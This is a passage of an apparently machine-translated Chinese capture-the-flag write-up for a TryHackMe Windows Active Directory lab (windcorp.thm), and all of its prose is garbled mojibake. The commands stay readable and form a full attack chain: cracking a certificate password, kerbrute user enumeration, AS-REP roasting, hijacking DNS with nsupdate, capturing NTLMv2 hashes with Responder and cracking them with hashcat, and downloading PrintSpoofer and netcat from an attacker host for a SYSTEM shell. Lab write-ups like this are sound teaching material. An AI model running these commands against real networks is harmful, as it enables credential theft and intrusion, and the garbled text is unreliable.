ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘å†³å®šçœ‹çœ‹æ˜¯å¦æœ‰åŠæ³•æå–å­˜å‚¨åœ¨è¯¥è¯ä¹¦ä¸­çš„ä¿¡æ¯ã€‚æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªå«<a class="ae kc" href="https://github.com/crackpkcs12/crackpkcs12" rel="noopener ugc nofollow" target="_blank"> <strong class="kf ir"> crackpkcs12 </strong> </a>çš„å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥ç ´è§£PKCS#12æ–‡ä»¶å¯†ç (æ‰©å±•å. p12æˆ–è€…ã€‚pfx)ã€‚æˆ‘ç”¨è¿™ä¸ªå·¥å…·å’Œ<strong class="kf ir"> rockyou </strong>å¯†ç åˆ—è¡¨è¿›è¡Œäº†ä¸€æ¬¡å­—å…¸æ”»å‡»ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="a60a" class="nb lk iq mx b gy nc nd l ne nf">crackpkcs12 -d rockyou.txt cert.pfx</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/d705f2a54ca24fb5052dcab09f973e6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/format:webp/1*nwkVWHMBfFKgKwsWGvvxmg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">è¯ä¹¦å¯†ç ã€‚</figcaption></figure><p id="48ba" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">è¿™æ˜¯å¯è¡Œçš„ï¼Œæˆ‘æ£€ç´¢äº†åˆ›å»ºè¯ä¹¦æ—¶ä½¿ç”¨çš„å¯†ç ï¼Œä½†æ˜¯ï¼Œæˆ‘è¿˜ä¸å¤ªç¡®å®šæˆ‘èƒ½åšäº›ä»€ä¹ˆã€‚æˆ‘å†³å®šå¯¹å¯ç”¨çš„æœåŠ¡è¿›è¡Œæ›´å¤šçš„æšä¸¾ã€‚</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="6559" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated"><strong class="ak"> SMBæšä¸¾</strong></h1><p id="aee3" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°ç«¯å£139å’Œ445æ˜¯æ‰“å¼€çš„ã€‚æˆ‘è¯•å›¾ä½¿ç”¨<strong class="kf ir"> smbmap </strong>æšä¸¾å…±äº«ï¼Œä½†ä¸å¹¸çš„æ˜¯ï¼ŒåŒ¿åç™»å½•æ²¡æœ‰å¯ç”¨ï¼Œå¯¼è‡´äº†ä¸€ä¸ªæ­»èƒ¡åŒã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="bf6a" class="nb lk iq mx b gy nc nd l ne nf">smbmap -H 10.10.138.163 -L</span></pre></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="9bee" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">Kerberosæšä¸¾</h1><p id="9095" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">NMAPæ‰«æçš„è¾“å‡ºæ˜¾ç¤ºç«¯å£88æ˜¯å¼€æ”¾çš„ï¼ŒKerberosåœ¨å…¶ä¸Šè¿è¡Œã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="d61e" class="nb lk iq mx b gy nc nd l ne nf">88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2022-04-15 13:32:06Z)</span></pre><p id="3827" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä½¿ç”¨å‰é¢åœ¨æ‰§è¡Œwebæšä¸¾æ—¶çœ‹åˆ°çš„ç”¨æˆ·åˆ—è¡¨ï¼Œæˆ‘å†³å®šé€šè¿‡æ»¥ç”¨Kerberosé¢„è®¤è¯æ¥ä½¿ç”¨<strong class="kf ir">Kerberos</strong>æšä¸¾æœ‰æ•ˆçš„active directoryç”¨æˆ·ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="b56b" class="nb lk iq mx b gy nc nd l ne nf">./kerbrute_linux_amd64 userenum --dc 10.10.172.217 -d windcorp.thm -o kerbrute-user-enum userlist</span><span id="7d35" class="nb lk iq mx b gy ng nd l ne nf">[+] VALID USERNAME:       organicfish718@windcorp.thm<br/>[+] VALID USERNAME:       Edeltraut@windcorp.thm<br/>[+] VALID USERNAME:       angrybird253@windcorp.thm<br/>[+] VALID USERNAME:       buse@windcorp.thm<br/>[+] VALID USERNAME:       Emile@windcorp.thm<br/>[+] VALID USERNAME:       tinygoose102@windcorp.thm<br/>[+] VALID USERNAME:       brownostrich284@windcorp.thm<br/>[+] VALID USERNAME:       sadswan869@windcorp.thm<br/>[+] VALID USERNAME:       goldencat416@windcorp.thm<br/>[+] VALID USERNAME:       whiteleopard529@windcorp.thm<br/>[+] VALID USERNAME:       orangegorilla428@windcorp.thm<br/>[+] VALID USERNAME:       happymeercat399@windcorp.thm<br/>[+] VALID USERNAME:       kirkug@windcorp.thm<br/>[+] VALID USERNAME:       emilieje@windcorp.thm<br/>[+] VALID USERNAME:       lilyle@windcorp.thm</span><span id="7e8d" class="nb lk iq mx b gy ng nd l ne nf">Done! Tested 48 usernames (15 valid) in 1.858 seconds</span></pre><p id="3fcf" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘èƒ½å¤Ÿè¯†åˆ«15ä¸ªæœ‰æ•ˆçš„ç”¨æˆ·åã€‚æˆ‘çš„ä¸‹ä¸€ä¸ªç›´è§‰æ˜¯ç”¨Impacketæ‰§è¡Œ<strong class="kf ir">as respreposing</strong>,ä½†ä¸å¹¸çš„æ˜¯ï¼Œæ²¡æœ‰ä¸€ä¸ªå¸æˆ·è¢«å‘ç°æ˜¯å¯æ¢å¤çš„ï¼Œè¿™å¯¼è‡´äº†å¦ä¸€ä¸ªæ­»èƒ¡åŒğŸ˜‘ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="3af9" class="nb lk iq mx b gy nc nd l ne nf">sudo python3 GetNPUsers.py windcorp.thm/ -dc-ip 10.10.172.217 -usersfile kerberos-usernames -no-pass -request -outputfile kerberos-users-found</span></pre></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="6499" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">ä¸å®‰å…¨çš„DNSæ›´æ–°</h1><p id="5065" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">åœ¨æˆ‘çš„æšä¸¾çš„å…¶ä½™éƒ¨åˆ†é™·å…¥æ­»èƒ¡åŒä¹‹åï¼Œæˆ‘å†³å®šå†æ¬¡å›é¡¾ç¬¬ä¸€ä¸ªæ ‡å¿—ä¸­æä¾›çš„æç¤ºã€‚æ ¹æ®æˆ‘ç›®å‰æ”¶é›†çš„ä¿¡æ¯ï¼Œä¼¼ä¹å¯ä»¥è¿›è¡Œä¸å®‰å…¨çš„DNSæ›´æ–°ã€‚æˆ‘å¯ä»¥é€šè¿‡ä½¿ç”¨<a class="ae kc" href="https://linux.die.net/man/8/nsupdate" rel="noopener ugc nofollow" target="_blank"><strong class="kf ir">n update</strong></a>å°è¯•æ·»åŠ ä¸€ä¸ªTXTè®°å½•æ¥æµ‹è¯•è¿™ä¸€ç‚¹ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="c507" class="nb lk iq mx b gy nc nd l ne nf">$ nsupdate</span><span id="bed6" class="nb lk iq mx b gy ng nd l ne nf">&gt; server 10.10.172.217<br/>&gt; update add test.windcorp.thm 5 TXT "This is a Test for Insecure DNS Update"<br/>&gt; send</span></pre><p id="2c5a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘å¯ä»¥ä½¿ç”¨<strong class="kf ir"> nslookup </strong>æ¥ç¡®è®¤TXTè®°å½•å·²ç»è¢«æ·»åŠ ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="a48d" class="nb lk iq mx b gy nc nd l ne nf">&gt; server 10.10.172.217<br/>Default server: 10.10.172.217<br/>Address: 10.10.172.217#53<br/>&gt; set type=txt<br/>&gt; test.windcorp.thm</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nr"><img src="../Images/88a6ad3d076d75b34e0c3f73f54dd0a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xbBxOrdA_tmeYlMFP12CGw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">æ·»åŠ äº†DNS TXTè®°å½•ã€‚</figcaption></figure><p id="4148" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘çœ‹åˆ°TXTè®°å½•å·²ç»æˆåŠŸæ·»åŠ äº†ï¼é‚£ç°åœ¨æ€ä¹ˆåŠï¼ŸğŸ˜…</p><p id="e8f2" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æœ€åˆï¼Œæˆ‘å¹¶ä¸ç¡®å®šæˆ‘è¯¥æ‹¿è¿™ä¸ªåšä»€ä¹ˆã€‚æˆ‘èŠ±äº†ä¸€äº›æ—¶é—´å›é¡¾æˆ‘æ”¶é›†çš„ä¿¡æ¯ï¼Œå¹¶å¼€å§‹æ€è€ƒæˆ‘å¯ä»¥ç”¨å®ƒæ¥è·å¾—ä¸€ä¸ªåˆæ­¥çš„ç«‹è¶³ç‚¹ã€‚æˆ‘åˆ›å»ºäº†ä»¥ä¸‹åˆ—è¡¨:</p><ul class=""><li id="318e" class="ns nt iq kf b kg kh kk kl ko nu ks nv kw nw la nx ny nz oa bi translated">åœ¨â€œ<strong class="kf ir"><em class="lb">self service . wind corp . thm</em></strong>â€æœ‰ä¸€ä¸ªä½¿ç”¨NTLMæˆæƒçš„è‡ªåŠ©æœåŠ¡ç™»å½•é—¨æˆ·ã€‚</li><li id="e5bf" class="ns nt iq kf b kg ob kk oc ko od ks oe kw of la nx ny nz oa bi translated">æ ¹æ®å›¾æ ‡é¢œè‰²çš„å˜åŒ–ï¼Œä¼¼ä¹æœ‰æ´»åŠ¨ç”¨æˆ·ç™»å½•ã€‚</li><li id="9b8e" class="ns nt iq kf b kg ob kk oc ko od ks oe kw of la nx ny nz oa bi translated">æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªè¯ä¹¦å¹¶ç ´è§£äº†å®ƒçš„å¯†ç ã€‚</li><li id="602f" class="ns nt iq kf b kg ob kk oc ko od ks oe kw of la nx ny nz oa bi translated">æˆ‘èƒ½å¤Ÿåœ¨æ²¡æœ‰è®¤è¯çš„æƒ…å†µä¸‹æ“ä½œDNSè®°å½•ã€‚</li><li id="7753" class="ns nt iq kf b kg ob kk oc ko od ks oe kw of la nx ny nz oa bi translated">æœ‰ä¸€ä¸ªPowerShell webè®¿é—®é¡µé¢ï¼Œä½†æˆ‘æ²¡æœ‰å‡­æ®ã€‚</li></ul><p id="e6a3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">çœ‹åˆ°è‡ªåŠ©ç™»å½•é—¨æˆ·å¦‚ä½•ä½¿ç”¨NTLMæˆæƒï¼Œæˆ‘æƒ³åˆ°äº†å¦‚ä½•ä½¿ç”¨Responderæ¥æ‹¦æˆªå’Œæ•è·NTLMæ•£åˆ—ã€‚å¦‚æœæˆ‘å¯ä»¥æ¨¡æ‹Ÿâ€œ<strong class="kf ir"><em class="lb">self service . wind corp . thm</em></strong>â€åŸŸï¼Œå°†DNSè®°å½•æ›¿æ¢ä¸ºæŒ‡å‘æˆ‘çš„IPåœ°å€çš„è®°å½•ï¼Œé‚£ä¹ˆæˆ‘å¯èƒ½èƒ½å¤Ÿæ•è·é€šè¿‡è‡ªåŠ©æœåŠ¡ç™»å½•é—¨æˆ·ç™»å½•çš„ç”¨æˆ·çš„NTLMå“ˆå¸Œã€‚</p><h2 id="c041" class="nb lk iq bd ll og oh dn lp oi oj dp lt ko ok ol lx ks om on mb kw oo op mf oq bi translated">DNSç¼“å­˜ä¸­æ¯’å’Œå“åº”è€…</h2><p id="b8b2" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘å¯ä»¥æ‰§è¡ŒDNSç¼“å­˜ä¸­æ¯’ã€‚</p><blockquote class="mm mn mo"><p id="19ab" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">DNSç¼“å­˜ä¸­æ¯’æ˜¯åœ¨DNSç¼“å­˜ä¸­è¾“å…¥é”™è¯¯ä¿¡æ¯çš„è¡Œä¸ºï¼Œå› æ­¤DNSæŸ¥è¯¢è¿”å›ä¸æ­£ç¡®çš„å“åº”ï¼Œç”¨æˆ·è¢«å®šå‘åˆ°é”™è¯¯çš„ç½‘ç«™ã€‚</p></blockquote><p id="0ec3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘é¦–å…ˆä½¿ç”¨<strong class="kf ir"> openssl </strong>ä»â€œ<strong class="kf ir"> <em class="lb"> cert.pfx </em> </strong>â€æ–‡ä»¶ä¸­æå–è¯ä¹¦å’Œç§é’¥ï¼Œå¹¶å°†å…¶ä¿å­˜åˆ°â€œ<strong class="kf ir"><em class="lb">/usr/share/responder/certs/</em></strong>â€ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="7035" class="nb lk iq mx b gy nc nd l ne nf"># Extract Cert<br/>openssl pkcs12 -in cert.pfx -out selfservice.cert.pem -clcerts -nokeys</span><span id="6143" class="nb lk iq mx b gy ng nd l ne nf"># Extract Key<br/>openssl pkcs12 -in cert.pfx -out selfservice.key.pem -nocerts -nodes</span></pre><p id="542f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ç¼–è¾‘äº†â€œ<strong class="kf ir"><em class="lb">/etc/Responder/Responder . conf</em></strong>â€ä¸­çš„Responder HTTPSæœåŠ¡å™¨è®¾ç½®ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="d4f0" class="nb lk iq mx b gy nc nd l ne nf">[HTTPS Server]</span><span id="f72c" class="nb lk iq mx b gy ng nd l ne nf">; Configure SSL Certificates to use<br/>SSLCert = <strong class="mx ir">/usr/share/responder/certs/selfservice.cert.pem</strong><br/>SSLKey = <strong class="mx ir">/usr/share/responder/certs/selfservice.key.pem</strong></span></pre><p id="2da3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ—¢ç„¶responderçš„HTTPSè®¾ç½®å·²ç»é…ç½®å¥½äº†ï¼Œæˆ‘ä½¿ç”¨<strong class="kf ir"> nsupdate </strong>åˆ é™¤äº†â€œ<strong class="kf ir"><em class="lb">self service . wind corp . thm</em></strong>â€çš„æ—§A DNSè®°å½•ï¼Œå¹¶æ·»åŠ äº†ä¸€ä¸ªè§£æä¸ºæˆ‘çš„æ”»å‡»æœºå™¨IPåœ°å€çš„æ–°Aè®°å½•ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="4e9c" class="nb lk iq mx b gy nc nd l ne nf">nsupdate<br/> <br/>&gt; server 10.10.231.107<br/>&gt; update delete selfservice.windcorp.thm<br/>&gt; send<br/>&gt; update add selfservice.windcorp.thm 86400 A 10.*.*.*<br/>&gt; send<br/>&gt; quit</span></pre><p id="be3a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æœ€åï¼Œæˆ‘æ‰§è¡Œresponderå¹¶ç­‰å¾…å®ƒæ•è·NTLMæ•£åˆ—ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="d07b" class="nb lk iq mx b gy nc nd l ne nf">python3 Responder.py -I tun0 -rdwv</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi or"><img src="../Images/3c72e9a140f8336cfedb0a42f43e96e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1332/format:webp/1*ODGj7Smun4pZXI0lUCpfyg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">å“åº”ç¨‹åºæ•è·çš„NTLMv2å“ˆå¸Œã€‚</figcaption></figure><p id="b540" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">å‡ ç§’é’Ÿåï¼ŒResponderä¸ºç”¨æˆ·"<strong class="kf ir"><em class="lb"/></strong>"æ•è·ä¸€ä¸ªNTLMv2å“ˆå¸ŒğŸ˜ƒï¼æˆ‘ç°åœ¨å¯ä»¥ä½¿ç”¨<strong class="kf ir"> hashcat </strong>æ¥ç ´è§£NTLMv2å“ˆå¸Œã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="8217" class="nb lk iq mx b gy nc nd l ne nf">hashcat64.exe -m 5600 hash.txt rockyou.txt</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi os"><img src="../Images/ea2d4aa5dca449187c20c4eebfcfe71a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1242/format:webp/1*j4pEtZTJY9wTIxJ1zjYgnw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ç ´è§£çš„NTLMv2å“ˆå¸Œã€‚</figcaption></figure><p id="07ae" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä½¿ç”¨è¿™äº›å‡­è¯ï¼Œæˆ‘èƒ½å¤Ÿç™»å½•åˆ°å‰é¢çœ‹åˆ°çš„PowerShell webè®¿é—®é¡µé¢ã€‚ä»è¿™é‡Œï¼Œæˆ‘èƒ½å¤Ÿè¾“å…¥å‘½ä»¤å¹¶æ£€ç´¢ç¬¬äºŒä¸ªæ ‡å¿—ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/f09aee05bf089500b33ad33ced5dcfec.png" data-original-src="https://miro.medium.com/v2/resize:fit:916/format:webp/1*w2KHIjWTcn6Xy0F4gbe4Gw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">æ——å¸œ2ã€‚</figcaption></figure></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="3d97" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">æƒé™æå‡</h1><p id="9ada" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">ä¸€æ—¦æˆ‘ç™»å½•åˆ°æœºå™¨ä¸Šï¼Œæˆ‘æ‰§è¡Œä¸€äº›åŸºæœ¬çš„æ‰‹åŠ¨æšä¸¾ï¼Œä»¥ç¡®å®šä¸€ç§æ–¹æ³•æ¥æå‡æˆ‘çš„ç‰¹æƒã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="6987" class="nb lk iq mx b gy nc nd l ne nf">whoami /all</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/94b9f9bc6769e3eaf068b923f38cfe54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1166/format:webp/1*fh_NFNXMsVVxkKnq9Drcqg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ç‰¹æƒä¿¡æ¯ã€‚</figcaption></figure><p id="ff65" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘çœ‹åˆ°å½“å‰ç”¨æˆ·æœ‰â€œ<strong class="kf ir"><em class="lb">SeImpersonatePrivilege</em></strong>â€ã€‚æ ¹æ®<a class="ae kc" href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#seimpersonateprivilege-3.1.1" rel="noopener ugc nofollow" target="_blank">é»‘å®¢æŠ€å·§</a>:</p><blockquote class="mm mn mo"><p id="5b89" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">ä»»ä½•æ‹¥æœ‰è¿™ä¸ªç‰¹æƒçš„è¿›ç¨‹éƒ½å¯ä»¥<strong class="kf ir">æ¨¡æ‹Ÿ</strong>(ä½†ä¸èƒ½åˆ›å»º)ä»»ä½•å®ƒèƒ½å¤Ÿè·å¾—å¥æŸ„çš„<strong class="kf ir">ä»¤ç‰Œ</strong>ã€‚ä½ å¯ä»¥ä»ä¸€ä¸ª<strong class="kf ir"> WindowsæœåŠ¡</strong> (DCOM)ä¸­è·å¾—ä¸€ä¸ª<strong class="kf ir">ç‰¹æƒä»¤ç‰Œ</strong>ï¼Œä½¿å…¶é’ˆå¯¹æ¼æ´æ‰§è¡Œä¸€ä¸ª<strong class="kf ir"> NTLMè®¤è¯</strong>ï¼Œç„¶åä½œä¸º<strong class="kf ir">ç³»ç»Ÿ</strong>æ‰§è¡Œä¸€ä¸ªè¿›ç¨‹ã€‚ä½¿ç”¨<a class="ae kc" href="https://github.com/ohpe/juicy-potato" rel="noopener ugc nofollow" target="_blank"> juicy-potato </a>ã€<a class="ae kc" href="https://github.com/antonioCoco/RogueWinRM" rel="noopener ugc nofollow" target="_blank"> RogueWinRM </a>(éœ€è¦ç¦ç”¨WinRM)ã€<a class="ae kc" href="https://github.com/CCob/SweetPotato" rel="noopener ugc nofollow" target="_blank"> SweetPotato </a>ã€<a class="ae kc" href="https://github.com/itm4n/PrintSpoofer" rel="noopener ugc nofollow" target="_blank"> PrintSpoofer </a>æ¥åˆ©ç”¨å®ƒã€‚</p></blockquote><p id="df70" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘å†³å®šåˆ©ç”¨PrintSpooferæ¼æ´ã€‚æˆ‘ç”¨PowerShellä¸Šä¼ äº†â€œ<strong class="kf ir">ã€PrintSpoofer.exeã€‘</strong>â€å’Œâ€œ<strong class="kf ir"><em class="lb">ã€nc.exeã€‘</em></strong>â€å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="8185" class="nb lk iq mx b gy nc nd l ne nf"># setup HTTP server on attacking machine where executables are stored.</span><span id="1fa0" class="nb lk iq mx b gy ng nd l ne nf">sudo python3 -m http.server 80</span><span id="7e43" class="nb lk iq mx b gy ng nd l ne nf"># Use Powershell to upload the executables.</span><span id="02da" class="nb lk iq mx b gy ng nd l ne nf">Invoke-WebRequest -Uri <a class="ae kc" href="http://10.2.36.156/PrintSpoofer.exe" rel="noopener ugc nofollow" target="_blank">http://10.*.*.*/PrintSpoofer.exe</a> -Outfile printspoofer.exe<br/>Invoke-WebRequest -Uri <a class="ae kc" href="http://10.2.36.156/nc.exe" rel="noopener ugc nofollow" target="_blank">http://10.*.*.*/nc.exe</a> -Outfile nc.exe</span></pre><p id="730e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ç”¨<strong class="kf ir"> netcat </strong>æ‰§è¡Œäº†â€œ<strong class="kf ir"><em class="lb">PrintSpoofer.exe</em></strong>â€æ¼æ´ï¼Œåˆ›å»ºäº†ä¸€ä¸ªäº¤äº’å¼shellã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="cc8d" class="nb lk iq mx b gy nc nd l ne nf">nc -lvnp 4444</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ov"><img src="../Images/8b1231fdc566dfce682079126ff93bfd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7EjnOsNBFlhkCbATb6-ScA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><strong class="bd ll"><em class="ow">PrintSpoofer.exe</em></strong>åˆ©ç”¨<strong class="bd ll"> netcatã€‚</strong></figcaption></figure><p id="31f9" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">è¿™ç»™äº†æˆ‘ä¸€ä¸ªæå‡çš„äº¤äº’å¼å¤–å£³ï¼Œä»é‚£é‡Œæˆ‘å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„æ ‡å¿—ï¼ğŸ˜„</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi ox"><img src="../Images/8a3528860f1503fbcc3ec23073daf975.png" data-original-src="https://miro.medium.com/v2/resize:fit:1184/format:webp/1*Zgko1LC-VyeiSa_I8aDe3w.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">æœ€ç»ˆæ——å¸œã€‚</figcaption></figure></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="0288" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">æœ€åçš„æƒ³æ³•</h1><p id="f369" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æˆ‘çœŸçš„å¾ˆå–œæ¬¢åœ¨è¿™ä¸ªæˆ¿é—´é‡Œå·¥ä½œã€‚å®ƒéœ€è¦å¤§é‡çš„æšä¸¾å’Œæ£€æŸ¥æœåŠ¡ï¼Œæ¯”å¦‚DNSï¼Œè¿™å¯èƒ½æ˜¯ä½ é€šå¸¸ä¼šå¿½ç•¥çš„ã€‚æœ€åˆçš„ç«‹è¶³ç‚¹ä¹Ÿéå¸¸æœ‰è¶£ï¼Œéœ€è¦æ‚¨æ‰§è¡Œéå¸¸å½»åº•çš„ä¿¡æ¯æ”¶é›†ï¼Œä»¥ä¾¿äº†è§£æ‚¨ç©¶ç«Ÿå¯ä»¥å¦‚ä½•åˆ©ç”¨ä¸å®‰å…¨çš„DNSåŠ¨æ€æ›´æ–°ã€‚è°¢è°¢ä½ ä¸€ç›´è¯»åˆ°æœ€åï¼Œç»§ç»­é»‘ä¸‹å»ğŸ˜„ï¼</p></div></div>    
</body>
</html>